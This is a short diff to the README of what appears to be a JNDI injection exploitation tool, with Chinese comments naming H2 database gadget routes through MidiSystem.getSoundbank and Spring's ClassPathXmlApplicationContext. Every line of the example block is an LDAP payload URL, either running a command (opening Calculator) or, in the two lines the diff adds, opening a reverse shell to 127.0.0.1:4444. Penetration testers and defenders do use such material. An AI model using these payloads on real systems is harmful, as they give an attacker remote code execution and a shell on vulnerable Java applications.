@@ -281,9 +281,11 @@ ldap://127.0.0.1:1389/Factory/H2/JavaScript/ReverseShell/127.0.0.1/4444
 ```bash
 # 基于 MidiSystem.getSoundbank 方法, 仅需 JRE + H2 依赖
 ldap://127.0.0.1:1389/Factory/H2/JRE/Soundbank/Command/open -a Calculator
+ldap://127.0.0.1:1389/Factory/H2/JRE/Soundbank/ReverseShell/127.0.0.1/4444
 
 # 基于 ClassPathXmlApplicationContext, 需要 Spring 依赖
 ldap://127.0.0.1:1389/Factory/H2/JRE/Spring/Command/open -a Calculator
+ldap://127.0.0.1:1389/Factory/H2/JRE/Spring/ReverseShell/127.0.0.1/4444
 ```
 
 #### Derby
